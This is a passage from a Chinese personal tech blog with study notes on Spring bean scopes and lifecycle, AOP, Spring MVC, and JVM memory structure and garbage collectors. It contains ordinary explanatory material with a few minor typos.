<li>Session：会话作用域，每个 HTTP 会话都将创建一个新的 Bean 实例，该 Bean 仅在当前 HTTP 会话中有效。</li>
<li>GlobalSession：全局会话作用域，仅适用于使用基于 Portlet 的 web 应用。它是在一个全局的 Portlet 会话中共享的 Bean 实例。</li>
</ul>
<p>除了这五种标准作用域外，Spring 还支持自定义作用域。在 Spring 中，我们可以通过实现 Scope 接口并重写对应方法来实现自定义作用域。这样可以让我们更加灵活地管理 Bean 的生命周期，以满足应用程序的特定需求。</p>
<h2 id="Bean的生命周期"><a href="#Bean的生命周期" class="headerlink" title="Bean的生命周期"></a>Bean的生命周期</h2><p>Spring Bean 的生命周期是 Spring IoC 容器管理的重要部分，它由一系列的回调函数来控制。在 Spring 容器创建 Bean 实例对象时，会经历以下阶段：</p>
<ol>
<li><p>Bean 实例化：Spring IoC 容器通过反射机制实例化一个 Bean 对象，通常是使用默认的构造函数来创建 Bean 实例。</p>
</li>
<li><p>属性注入：Spring IoC 容器通过 setter 方法或者直接访问 Bean 属性来注入 Bean 的属性。</p>
</li>
<li><p>BeanPostProcessor 前置处理器：在 Bean 实例化之后，Spring IoC 容器会自动检测是否有实现了 BeanPostProcessor 接口的类，并调用它们的 postProcessBeforeInitialization() 方法来对 Bean 进行前置处理。</p>
</li>
<li><p>初始化：Spring IoC 容器调用 Bean 实现 InitializingBean 接口或者配置的 init-method 方法，执行 Bean 的初始化操作。</p>
</li>
<li><p>BeanPostProcessor 后置处理器：在 Bean 初始化之后，Spring IoC 容器会自动检测是否有实现了 BeanPostProcessor 接口的类，并调用它们的 postProcessAfterInitialization() 方法来对 Bean 进行后置处理。</p>
</li>
<li><p>使用：Bean 实例化完成并初始化后，就可以在应用程序中使用它了。</p>
</li>
<li><p>销毁：当 Spring IoC 容器关闭时，它会调用 Bean 实现 DisposableBean 接口或者配置的 destroy-method 方法，执行 Bean 的销毁操作。</p>
</li>
</ol>
<p>此外，Spring Bean 的生命周期可以被定制化，我们可以自定义 BeanPostProcessor 实现类或者配置 init-method 和 destroy-method 方法，来在 Bean 的生命周期中加入自己的逻辑处理。</p>
<p>BeanPostProcessor 前置处理器是 Spring IoC 容器中的一个扩展点，用于在 Bean 的初始化前进行额外的处理，可以对 Bean 对象进行修改或增强。BeanPostProcessor 接口定义了两个方法：</p>
<ol>
<li><p>postProcessBeforeInitialization(Object bean, String beanName)：在 Bean 初始化之前调用该方法，可以对 Bean 对象进行一些修改或增强操作。</p>
</li>
<li><p>postProcessAfterInitialization(Object bean, String beanName)：在 Bean 初始化之后调用该方法，可以对 Bean 对象进行一些修改或增强操作。</p>
</li>
</ol>
<p>在 Spring IoC 容器中，当一个 Bean 实例化完成后，会检查是否有实现了 BeanPostProcessor 接口的类，如果有，则会依次调用它们的 postProcessBeforeInitialization() 方法，然后进行 Bean 的初始化操作，最后再依次调用实现了 BeanPostProcessor 接口的类的 postProcessAfterInitialization() 方法。通过实现 BeanPostProcessor 接口，我们可以在 Bean 实例化前后进行一些自定义的操作，例如：</p>
<ol>
<li><p>为 Bean 注入日志处理、事务处理等公共的功能。</p>
</li>
<li><p>在 Bean 初始化前后进行性能监控、安全检查等操作。</p>
</li>
<li><p>对 Bean 进行代理，实现 AOP 的功能。</p>
</li>
</ol>
<p>需要注意的是，在实现 BeanPostProcessor 接口时，必须小心处理，以免破坏 Bean 的正常生命周期。同时，也应该尽量保持 BeanPostProcessor 的轻量级，避免对系统性能产生过大的影响。</p>
<p>总之，BeanPostProcessor 前置处理器是 Spring IoC 容器中的一个重要扩展点，通过实现该接口，可以在 Bean 实例化前后进行一些自定义的操作，从而增强 Bean 的功能和灵活性。</p>
<h1 id="Spring-AOP原理"><a href="#Spring-AOP原理" class="headerlink" title="Spring AOP原理"></a>Spring AOP原理</h1><h2 id="AOP简介"><a href="#AOP简介" class="headerlink" title="AOP简介"></a>AOP简介</h2><p>Spring AOP通过面向切面技术，将与业务无关或被业务模块共用的代码封装起来，以提高代码的复用度，降低模块间的耦合度</p>
<h2 id="AOP-的核心概念"><a href="#AOP-的核心概念" class="headerlink" title="AOP 的核心概念"></a>AOP 的核心概念</h2><table>
<thead>
<tr>
<th>概念</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>切面（Aspect）</td>
<td>对一个或多个横切关注点的封装，它包含了切点、通知和切点表达式等元素。切面定义了何时、何地以及如何将横切关注点织入到目标对象中。</td>
</tr>
<tr>
<td>切点（Pointcut）</td>
<td>目标对象中的一组方法或者类，它们将被织入到横切关注点中。切点通常由切点表达式和其他过滤条件组成。</td>
</tr>
<tr>
<td>通知（Advice）</td>
<td>在织入横切关注点时要执行的逻辑代码，它包括了前置通知、后置通知、环绕通知、异常通知和最终通知等不同类型。</td>
</tr>
<tr>
<td>切点表达式（Pointcut Expression）</td>
<td>一种指定切点的语法规则，它可以根据方法名、返回值类型、方法参数等多种条件进行切点匹配。</td>
</tr>
<tr>
<td>连接点（Join Point）</td>
<td>程序执行过程中的某个特定位置，例如方法调用、方法执行、异常抛出等。连接点是织入横切关注点的具体执行位置。</td>
</tr>
<tr>
<td>织入（Weaving）</td>
<td>将横切关注点应用到目标对象的过程，它可以通过代理模式实现。在 Spring AOP 中，织入分为编译期织入、类装载期织入和运行期织入三种方式。</td>
</tr>
</tbody></table>
<p>上述概念是 Spring AOP 技术中的核心要素，了解这些概念对于掌握和使用 Spring AOP 技术非常重要。切面、切点、通知和切点表达式是定义 AOP 配置的基础，连接点则表示切点匹配到的具体执行位置，织入则是实现 AOP 功能的核心机制。</p>
<h2 id="AOP横切关注点"><a href="#AOP横切关注点" class="headerlink" title="AOP横切关注点"></a>AOP横切关注点</h2><p>Srping将应用分为核心关注点和横切关注点两部分</p>
<ul>
<li><p>核心关注点（Core Concerns）是指应用程序的基本业务逻辑，例如数据访问、业务逻辑处理等。核心关注点是应用程序的主要功能，通常是由应用程序开发人员直接实现的。</p>
</li>
<li><p>横切关注点（Cross-Cutting Concerns）是指应用程序中与核心业务逻辑无关的横切问题，例如日志记录、事务管理、安全控制等。</p>
</li>
</ul>
<p>在 Spring AOP 中，横切关注点可以通过定义切面（Aspect）来实现。通常情况下，切面是一个 Java 类，其中包含了一些切点（Pointcut）、通知（Advice）和切点表达式（Pointcut Expression）等元素。</p>
<ul>
<li>切点（Pointcut）：用于定义一个或多个目标对象中哪些方法需要被织入横切关注点。</li>
<li>通知（Advice）：定义了横切关注点在目标对象中何时被执行以及执行的逻辑。</li>
<li>切点表达式（Pointcut Expression）：用于指定切点的匹配规则。</li>
</ul>
<p>Spring AOP 的实现是基于代理模式的，它通过创建代理对象来织入切面逻辑。Spring AOP 支持两种代理方式：JDK 动态代理和 CGLIB 代理。对于实现了接口的类，Spring AOP 将使用 JDK 动态代理来创建代理对象；对于没有实现接口的类，Spring AOP 将使用 CGLIB 代理来创建代理对象。</p>
<h2 id="AOP的5种通知类型"><a href="#AOP的5种通知类型" class="headerlink" title="AOP的5种通知类型"></a>AOP的5种通知类型</h2><p>Spring AOP 提供了以下五种类型的通知：</p>
<ul>
<li>前置通知（Before Advice）：在目标方法执行前执行。</li>
<li>后置通知（After Returning Advice）：在目标方法返回后执行。</li>
<li>环绕通知（Around Advice）：在目标方法执行前后都执行。</li>
<li>异常通知（After Throwing Advice）：在目标方法抛出异常时执行。</li>
<li>最终通知（After Advice）：无论目标方法是否正常执行完成，最终通知都会被执行。</li>
</ul>
<h2 id="AOP的应用"><a href="#AOP的应用" class="headerlink" title="AOP的应用"></a>AOP的应用</h2><table>
<thead>
<tr>
<th>应用场景</th>
<th>切面类型</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>日志记录</td>
<td>前置通知（Before）</td>
<td>在用户登录时记录登录时间和 IP 地址</td>
</tr>
<tr>
<td>性能监控</td>
<td>环绕通知（Around）</td>
<td>在对数据库进行查询时统计查询时间和资源占用情况</td>
</tr>
<tr>
<td>安全控制</td>
<td>前置通知（Before）</td>
<td>在访问受保护的资源时检查用户的身份和权限信息</td>
</tr>
<tr>
<td>事务管理</td>
<td>环绕通知（Around）</td>
<td>在对数据库进行更新操作时开启和提交事务</td>
</tr>
<tr>
<td>异常处理</td>
<td>异常通知（AfterThrowing）</td>
<td>在文件上传时捕获文件格式不正确等异常信息，并进行相应的处理</td>
</tr>
</tbody></table>
<h1 id="Spring-MVC原理"><a href="#Spring-MVC原理" class="headerlink" title="Spring MVC原理"></a>Spring MVC原理</h1><h2 id="MVC简介"><a href="#MVC简介" class="headerlink" title="MVC简介"></a>MVC简介</h2><p>Spring的MVC即模型-视图-控制器，该框架围绕DispatcherServlet设计而成，DispatcherServlet会把请求分发给各个处理器</p>
<p>SpringMVC 的工作流程主要包括以下几个步骤：</p>
<ol>
<li><p>客户端发送请求：客户端向服务器发送请求，请求可以是一个 URL 地址、一个表单提交或者一个 AJAX 请求。</p>
</li>
<li><p>DispatcherServlet 接收请求：DispatcherServlet 是 SpringMVC 框架的核心控制器，它负责接收客户端发送的请求，并将请求转发给对应的处理器。</p>
</li>
<li><p>HandlerMapping 查找处理器：HandlerMapping 负责根据请求 URL 查找对应的处理器，处理器可以是一个 Controller 或者一个 Restful Web Service。</p>
</li>
<li><p>HandlerAdapter 调用处理器：HandlerAdapter 负责调用处理器，将请求传递给处理器进行处理，并获取处理器的处理结果。</p>
</li>
<li><p>处理器处理请求：处理器根据请求的类型和参数，进行相应的业务处理，并返回一个 ModelAndView 对象。</p>
</li>
<li><p>视图解析器解析视图：视图解析器根据 ModelAndView 中的视图名，将其解析成对应的视图对象，视图可以是一个 JSP 页面、一个 Thymeleaf 模板或者一个 HTML 片段等。</p>
</li>
<li><p>渲染视图：视图对象根据数据模型和视图模板，生成 HTML 内容，并将其返回给客户端。</p>
</li>
<li><p>返回响应：DispatcherServlet 将视图渲染的结果返回给客户端，客户端可以是一个浏览器、一个移动应用或者一个 API 调用。</p>
</li>
</ol>
<p>总之，SpringMVC 的工作流程涉及到多个组件之间的协作，其中 DispatcherServlet 负责接收请求和控制流程，HandlerMapping 负责查找处理器，HandlerAdapter 负责调用处理器，视图解析器负责解析视图，视图对象负责渲染视图，最终将响应返回给客户端。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/05/%E7%A7%92%E6%9D%80%E9%A1%B9%E7%9B%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/05/%E7%A7%92%E6%9D%80%E9%A1%B9%E7%9B%AE/" class="post-title-link" itemprop="url">秒杀项目</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2023-05-05 20:55:32 / Modified: 21:00:17" itemprop="dateCreated datePublished" datetime="2023-05-05T20:55:32+08:00">2023-05-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="名词"><a href="#名词" class="headerlink" title="名词"></a>名词</h1><p>SpringBoot项目会以自动化的配置的形式自动加载到项目对应的工程当中</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://songbaoru.github.io/2023/05/03/JVM%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="SBR">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SBR Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | SBR Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/03/JVM%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">JVM底层原理</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2023-05-03 09:21:36" itemprop="dateCreated datePublished" datetime="2023-05-03T09:21:36+08:00">2023-05-03</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-05-10 18:14:12" itemprop="dateModified" datetime="2023-05-10T18:14:12+08:00">2023-05-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <blockquote>
<p>JVM（Java Virtual Machine）用于运行Java字节码</p>
</blockquote>
<h1 id="JVM结构规范和执行流程"><a href="#JVM结构规范和执行流程" class="headerlink" title="JVM结构规范和执行流程"></a>JVM结构规范和执行流程</h1><h2 id="JVM的结构及其作用"><a href="#JVM的结构及其作用" class="headerlink" title="JVM的结构及其作用"></a>JVM的结构及其作用</h2><p>JVM 主要由以下部分组成：类加载器、运行时数据区、执行引擎和本地方法接口</p>
<ol>
<li><p>类加载器：类加载器负责将类文件（.class 文件）加载到 JVM 中，并生成对应的 Class 对象。类加载器是 JVM 的一个重要组成部分，它将类文件加载到 JVM 中，并根据需要进行链接、验证和初始化。类加载器按照类文件的位置、来源和访问权限等进行分类，通常分为三种类型：引导类加载器、扩展类加载器和应用程序类加载器。</p>
</li>
<li><p>运行时数据区：运行时数据区即 JVM 内存，存储JVM在运行过程中产生的数据，它由多个不同的数据区域组成，包括方法区、堆、虚拟机栈、本地方法栈和程序计数器等。</p>
<p>每个线程都有自己的虚拟机栈和本地方法栈，用于存储方法的参数、局部变量和返回值等信息。堆用于存储对象实例，方法区用于存储类信息、常量、静态变量和编译器生成的代码等。虚拟机栈用于管理Java方法的调用。而本地方法栈则用于管理native方法（例如Thread.start()）的调用</p>
</li>
<li><p>执行引擎：Execution Engine 是 JVM 的核心组件，它负责执行在 JVM 中加载的字节码指令。它包括解释器和即时编译器两种执行方式。此外还包含垃圾回收器，用于内存管理，可以自动释放不再使用的内存空间</p>
</li>
<li><p>本地方法接口：Native Method Interface 允许 Java 程序与底层的本地系统交互，例如调用 C&#x2F;C++ 等语言编写的库</p>
</li>
</ol>
<h2 id="HotSpot-JVM内存模型"><a href="#HotSpot-JVM内存模型" class="headerlink" title="HotSpot JVM内存模型"></a>HotSpot JVM内存模型</h2><p>HotSpot JVM的JVM结构（可以划分为三类）：</p>
<p>线程私有区域</p>
<ul>
<li><p>Java虚拟机栈</p>
<p>“栈内存”通常指的就是这里的Java虚拟机栈</p>
<p>线程内存模型（栈帧）：存储了局部变量表、操作数栈、动态链接、方法出口等信息</p>
<ol>
<li>局部变量表存储的信息<ol>
<li>基本数据类型：局部变量表存储了基本数据类型的值，包括 int、long、float、double、byte、short 和 char。</li>
<li>对象引用：局部变量表还存储了对象引用，即指向对象实例在Java堆中的指针。对于类实例和数组，这些引用通常是指向堆内存中的对象实例的指针。</li>
<li>returnAddress类型：returnAddress类型用于存储字节码指令的地址。当Java虚拟机执行到一个方法调用指令时，它会将下一条要执行的指令的地址保存到局部变量表。当方法执行完毕后，Java虚拟机通过局部变量表中保存的returnAddress返回到调用者的代码中继续执行。</li>
</ol>
</li>
<li>局部变量表的容量以局部变量槽（Local Variable Slot）为单位进行度量。一个局部变量槽可以存储一个32位的数据类型（如int、float、reference和returnAddress），而64位的数据类型（如long和double）则需要两个连续的局部变量槽来存储。</li>
</ol>
<p>处理动态链接方法的返回值和异常处理分派</p>
<p>记录了方法的执行过程</p>
</li>
<li><p>本地方法栈</p>
<p>本地方法栈和Java虚拟机栈唯一的不同是，本地方法栈存储的是Native方法的数据，Java虚拟机栈存储的是Java方法的数据</p>
</li>
<li><p>程序计数器</p>
<p>如果该线程执行的是Native方法，则程序计数器的值为空</p>
</li>
</ul>
<p>线程共享区域：</p>
<ul>
<li><p>Java堆</p>
<p>JVM运行过程中创建的对象几乎都会被存储在堆中。</p>
<p>是垃圾收集器管理的内存区域，又称“GC堆”。由于JVM采用分代回收算法，Java 堆从GC（Garbage Collection）的角度还可以细分为新生代（Eden、SurvivorTo、SurvivorFrom）、老年代</p>
</li>
<li><p>方法区（元空间）</p>
<p>常量、静态变量、即时编译器编译后的代码、类型信息缓存等数据</p>
</li>
</ul>
<p>直接内存</p>
<p>又称“堆外内存”，NIO（New Input&#x2F;Output）类引入了一种基于通道（Channel）和缓冲区（Buffer）的I&#x2F;O方式，可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆里面的DirectByteBuffer对象作为这块内存的引用进行操作，避免在Java堆和Native堆中来回复制数据。</p>
<h2 id="JVM执行Java程序的流程"><a href="#JVM执行Java程序的流程" class="headerlink" title="JVM执行Java程序的流程"></a>JVM执行Java程序的流程</h2><p>运行一个Java程序时，JVM执行以下步骤：</p>
<ol>
<li><p>编译：首先，Java源代码（.java文件）需要被编译成字节码（.class文件）。编译过程由Java编译器（javac）完成。编译器会将Java源代码转换成与平台无关的字节码文件。</p>
</li>
<li><p>类加载阶段</p>
<ol>
<li><p>加载：在程序运行时，JVM负责加载字节码文件。这一过程由类加载器（ClassLoader）负责。类加载器首先查找并加载类文件，然后将字节码转换为JVM内部的数据结构。</p>
</li>
<li><p>验证：字节码文件加载后，JVM会对其进行验证，确保代码是安全和符合规范的。验证过程包括检查字节码的结构、数据类型、操作数栈等。若字节码不符合规范，JVM将拒绝执行。</p>
</li>
<li><p>准备：验证通过后，JVM为类中的静态变量分配内存并设置默认值。这一过程确保在初始化阶段为静态变量赋值时已有可用的内存。</p>
</li>
<li><p>解析：JVM对类的符号引用进行解析，将它们替换为实际的内存地址。这包括将类、字段、方法等的引用转换为具体的内存地址或偏移量。</p>
</li>
<li><p>初始化：在解析完成后，JVM执行类的初始化代码。这包括执行静态初始化块和为静态变量赋值。初始化阶段确保类在使用前已经被正确初始化。</p>
</li>
</ol>
</li>
<li><p>解释执行：JVM开始执行字节码。字节码由JVM的解释器逐条解释执行，或通过即时编译器（JIT）编译成本地代码后执行。JVM管理内存、线程、异常处理等，确保程序能够在一个独立的运行时环境中运行。</p>
</li>
<li><p>垃圾回收：在程序运行过程中，JVM负责管理内存。当对象不再被引用时，垃圾回收器（Garbage Collector）会自动回收其占用的内存，确保内存的有效利用。</p>
</li>
<li><p>结束：当程序执行完成或遇到异常时，JVM将执行结束操作。这包括释放内存、关闭资源、销毁线程等。最后，JVM退出并结束运行。</p>
</li>
</ol>
<h1 id="垃圾回收理论"><a href="#垃圾回收理论" class="headerlink" title="垃圾回收理论"></a>垃圾回收理论</h1><h2 id="判断一个对象是否存活的算法"><a href="#判断一个对象是否存活的算法" class="headerlink" title="判断一个对象是否存活的算法"></a>判断一个对象是否存活的算法</h2><ul>
<li>引用计数算法</li>
<li>可达性分析算法</li>
</ul>
<h2 id="分代回收理论"><a href="#分代回收理论" class="headerlink" title="分代回收理论"></a>分代回收理论</h2><p>分代收集理论建立在两个假说之上，分别是弱分代假说和强分代假说</p>
<p>根据对象的生命周期将内存分为新生代和老年代两个部分。优先回收新生代中的对象，减少全局垃圾回收的次数，提高效率。  回收效率高，不容易产生内存碎片。缺点是需要对内存进行分代管理，增加了复杂性。</p>
<h2 id="Apple式回收"><a href="#Apple式回收" class="headerlink" title="Apple式回收"></a>Apple式回收</h2><p>Apple式回收（基于分代收集理论和标记复制算法）：把新生代分为一块较大的Eden空间和两块较小的Survivor空间，每次分配内存只使用Eden和一块Survivor。发生垃圾收集时，将Eden和Survivor中仍然存活的对象一次性复制到另外一块Survivor空间上。然后直接清理掉Eden和已经使用过的那块Survivor。当存储存活对象的Survivor不足以容纳所有的存活对象，Apple式回收就使用其他内存区域（大多是老年代）进行分配担保。</p>
<h2 id="垃圾回收类型"><a href="#垃圾回收类型" class="headerlink" title="垃圾回收类型"></a>垃圾回收类型</h2><ul>
<li>部分收集<ul>
<li>新生代收集（Minor GC）</li>
<li>老年代收集（Major GC）</li>
</ul>
</li>
<li>整堆收集（Full GC）</li>
</ul>
<h2 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h2><p>判断对象是否“存活”的方法有引用计数算法和可达性分析法。</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>时间</th>
<th>基本原理</th>
<th>优点</th>
<th>缺点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>标记-清除算法</td>
<td>20世纪50年代</td>
<td>标记所有活动对象，然后清除所有未标记的对象。 也可以反过来。 是最基础的垃圾收集算法，后续的回收算法大都是以标记-清除算法为基础，对其缺点进行改进得到的。</td>
<td>简单易懂，可处理循环引用的情况。</td>
<td>效率不稳定，容易产生内存碎片。</td>
<td>由于，不需要内存移动，所以再内存回收时延迟低，关注延迟的CMS收集器则是基于标记-清除算法的，不过CMS收集器面临空间碎片过多时，会采用标记-整理算法清除一次。（用于老年代）</td>
</tr>
<tr>
<td>标记-复制算法</td>
<td>20世纪60年代</td>
<td>将内存分成已使用（From）和空闲（To）区域。在垃圾回收时，将存活的对象从 From 区域复制到 To 区域，然后清空 From 区域。现在的商业虚拟机都采用这种收集算法来回收新生代。</td>
<td>不容易产生内存碎片。</td>
<td>浪费一半内存空间。如果多数对象都是存活的，就会产生大量内存间的复制开销</td>
<td>由于，如果多数对象都是可回收的，需要复制的只是占少数的存活对象。所以适合新生代。现在的商用虚拟机大多优先采用这种算法回收新生代。（用于新生代）</td>
</tr>
<tr>
<td>标记-整理算法</td>
<td>20世纪60年代</td>
<td>其标记过程仍然和标记-清除算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活对象向内存空间的一端移动，然后直接清理掉边界外的内存。</td>
<td>不容易产生内存碎片。</td>
<td>需要移动对象，可能会造成较长的停顿时间。</td>
<td>由于，是否移动内存是优缺点并存的，移动则内存回收时会耗时，不移动则内存分配时会耗时。如果不移动内存，即使垃圾收集器的效率提高一些，则因为内存分配和访问比垃圾收集频率要高得多，这部分耗时增加，总的吞吐量仍然会下降。所以，关注吞吐量的Parallel Old是基于标记-整理算法的。（用于老年代）</td>
</tr>
</tbody></table>
<h2 id="HotSpot垃圾回收算法实现细节"><a href="#HotSpot垃圾回收算法实现细节" class="headerlink" title="HotSpot垃圾回收算法实现细节"></a>HotSpot垃圾回收算法实现细节</h2><p>根节点</p>
<p>安全点</p>
<p>并发可达性分析</p>
<h1 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h1><p>Java 的垃圾回收器有多种实现方式，每种垃圾回收器都有其独特的特点和适用场景。</p>
<h2 id="垃圾收集器下的并行和并发"><a href="#垃圾收集器下的并行和并发" class="headerlink" title="垃圾收集器下的并行和并发"></a>垃圾收集器下的并行和并发</h2><ul>
<li>并行：描述的是多条垃圾收集器线程之间的关系</li>
<li>并发：描述的是垃圾收集器和用户线程之间的关系</li>
</ul>
<h2 id="经典垃圾回收器"><a href="#经典垃圾回收器" class="headerlink" title="经典垃圾回收器"></a>经典垃圾回收器</h2><p>这里讨论的经典垃圾收集器是JDK7 Update4之后，JDK11正式发布之前，OracleJDK和HotSpot虚拟机所包含的全部可用的垃圾收集器。</p>
<h3 id="新生代垃圾回收器"><a href="#新生代垃圾回收器" class="headerlink" title="新生代垃圾回收器"></a>新生代垃圾回收器</h3><p>所有的新生代的垃圾回收器都是复制算法</p>
<table>
<thead>
<tr>
<th><strong>收集器</strong></th>
<th><strong>收集对象和算法</strong></th>
<th><strong>收集器类型</strong></th>
<th>优点</th>
<th>缺点</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Serial</td>
<td>新生代，复制算法</td>
<td>单线程</td>
<td>所有收集器中内存消耗最小的</td>
<td>用户线程停顿时间长</td>
<td>单线程强调的是它在垃圾收集时，必须暂停其他所有工作线程，知道它收集完成。是HotSpot虚拟机运行在客户端模式下默认新生代收集器。适合处理器核心较少的环境。</td>
</tr>
<tr>
<td>ParNew</td>
<td>新生代，复制算法</td>
<td>并行的多线程收集器</td>
<td>只有ParNew能和CMS配合使用。有自适应的调节策略</td>
<td></td>
<td>实际上是Serial的多线程版本，除了同时使用多条线程进行垃圾收集外，其余都和Serial一样。默认开启和处理器核心数量相同的线程数，在目前服务器CPU往往达到32核核环境下，可以适用-XX:ParallelGCThreads参数来限制。</td>
</tr>
<tr>
<td>Parallel Scavenge</td>
<td>新生代，复制算法</td>
<td>并行的多线程收集器</td>
<td>吞吐量高</td>
<td></td>
<td>Parallel Scavenge的特点是它的关注点和其它收集器不同，Parallel Scavenge关注点是吞吐量，所谓吞吐量就是处理器用于运行用户代码的时间和处理器总消耗时间的比值。其合适的搭配是Parallel Old</td>
</tr>
</tbody></table>
<h3 id="老年代垃圾收集器"><a href="#老年代垃圾收集器" class="headerlink" title="老年代垃圾收集器"></a>老年代垃圾收集器</h3><p>老年代会有两种算法，标记整理算法 和 标记清除算法</p>
<table>
<thead>
<tr>
<th><strong>收集器</strong></th>
<th><strong>收集对象和算法</strong></th>
<th><strong>收集器类型</strong></th>
<th>优点</th>
<th>缺点</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Serial Old</td>
<td>老年代，标记整理算法</td>
<td>单线程</td>
<td></td>
<td></td>
<td>是Serial的老年代版本</td>
</tr>
<tr>
<td>Parallel Old</td>
<td>老年代，标记整理算法</td>
<td>并行的多线程收集器</td>
<td></td>
<td></td>
<td>是Parallel Scavenge的老年代版本</td>
</tr>
<tr>
<td>CMS</td>
<td>老年代，标记清除算法</td>
<td>并行与并发收集器</td>
<td>是一种以获取最短用户线程停顿时间为目标的收集器，适合关注服务响应速度的场景</td>
<td>内存碎片：标记清除的回收方法会导致内存碎片，影响大对象分配。 CPU资源消耗：并发执行需占用额外CPU资源，可能影响总体性能。 浮动垃圾：无法处理并发标记阶段产生的新垃圾，可能导致内存浪费。 预测性能不稳定：基于触发条件，设置不合理时可能导致停顿时间过长。 长时间Full GC：某些情况下，CMS无法回收足够空间，触发Full GC，导致停顿。 实现复杂：相对其他收集器，CMS实现复杂，维护困难，可能出现错误或性能问题。</td>
<td>运作过程相对复杂，整个过程分为四步：初始标记、并发标记、重新标记、并发清除。</td>
</tr>
</tbody></table>
<h3 id="全功能垃圾收集器"><a href="#全功能垃圾收集器" class="headerlink" title="全功能垃圾收集器"></a>全功能垃圾收集器</h3><table>
<thead>
<tr>
<th><strong>收集器</strong></th>
<th><strong>收集对象和算法</strong></th>
<th><strong>收集器类型</strong></th>
<th>优点</th>
<th>缺点</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>G1</td>
<td>跨新生代和老年代；化整为零</td>
<td>并行与并发收集器</td>
<td>回收的最小单元不再是固定大小的新生代和老年代，而是Region，进而采用具有优先级的区域回收方式，保证了G1收集器在有限的时间内获取尽可能高的收集效率。</td>
<td></td>
<td>开创了面向局部收集的设计思路和基于Region的内存布局形式，不再以固定大小及固定数量的分代区域划分，而是把连续的Java堆划分为多个大小相等的独立区域（Region），每一杠Region根据需要，扮演新生代的Eden空间、Survior区间，或者老年代空间。并对不同角色的Region采用不同的策略去处理。Region中还有一类特殊的区域，Humongous，用来存储大对象。G1在大内存应用上表现好，CMS在小内存应用上表现优于G1。G1 垃圾收集器是 JDK 9 及其之后版本的默认垃圾收集器。</td>
</tr>
</tbody></table>
<h2 id="低延迟垃圾回收器"><a href="#低延迟垃圾回收器" class="headerlink" title="低延迟垃圾回收器"></a>低延迟垃圾回收器</h2><p>Shenandoah （<em>ˌʃɛnənˈdoʊə</em>）和ZGC两款垃圾收集器在几乎整个工作时间里都是并发的，而CMS和G1在回收新生代的垃圾时必须挂起用户线程。并且这两款垃圾收集器可以在任意可管理的堆容量下实现垃圾收集的停顿不超过十毫秒。</p>
<p>Shenandoah垃圾回收器是一款只有OpenJDK才会包含，而OracleJDK里不存在的收集器，Shenandoah和G1有着相似的堆内存布局，是基于G1开发的，并对G1的一些不足进行了改进</p>
<p>ZGC是一款基于Region内存布局的，使用了读屏障、染色体指针和内存多重映射等技术来实现可并发的标记-整理算法，以低延迟为首要目标的垃圾收集器</p>
<h2 id="不进行垃圾回收的垃圾收集器"><a href="#不进行垃圾回收的垃圾收集器" class="headerlink" title="不进行垃圾回收的垃圾收集器"></a>不进行垃圾回收的垃圾收集器</h2><p>Epsilon 垃圾回收器是一款以不进行垃圾回收的垃圾回收器，只复责分配和释放内存空间、与解释器协作、与编译器协作等简单的内存管理任务。</p>
<p>在实际生产环境中是有用武之地的，比如以下两种情景：</p>
<ol>
<li>如果应用只需要运行数分钟或数秒，只要Java虚拟机能正确的分配内存，在堆耗尽之前就会退出，那显然没有任何回收行为的Epsilon就很合适。</li>
<li>需要剥离垃圾回收器影响的性能测试和压力测试</li>
</ol>
